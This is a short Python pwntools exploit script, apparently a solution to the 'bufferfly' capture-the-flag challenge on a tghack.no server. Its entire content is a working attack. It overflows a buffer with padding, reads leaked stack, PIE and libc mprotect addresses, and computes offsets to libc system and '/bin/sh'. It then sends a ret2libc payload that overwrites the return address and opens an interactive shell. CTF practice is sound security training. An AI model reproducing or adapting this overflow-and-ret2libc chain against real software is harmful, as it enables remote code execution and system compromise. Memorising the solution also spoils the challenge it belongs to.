from pwn import *
target=remote('bufferfly.tghack.no',6002)
print(target.recvuntil('yourself."'))

payload="A"*17
payload+=p8(0x0)
payload+=p32(0x19)

target.sendline(payload)

print(target.recvuntil("one at"))
leak=target.recvuntil("!").strip("!")
addr=int(leak,16)
print(target.recvuntil("now?\n"))

payload="A"*32
payload+=p32(addr)
target.sendline(payload)

print(target.recvuntil('for?"\n'))
target.sendline("open_door")
print(target.recvuntil("here: "))
pieleak=target.recvuntil(".").strip(".")
print((pieleak))
print(target.recvuntil("done?\n"))
target.sendline("nah")
print(target.recvline())
target.sendline("mprotec")
print(target.recvuntil("fact: "))
libc_mprotect=int(target.recvuntil(".").strip("."),16)
print(hex(libc_mprotect))
target.sendline("f")

payload="A"*72
libc_system=libc_mprotect-0xb5f00
libc_binsh=libc_mprotect+0x88cbf
payload+=p32(libc_system)
payload+=p32(0xdeadbeef)
payload+=p32(libc_binsh)
target.sendline(payload)
target.sendline("done")

target.interactive()
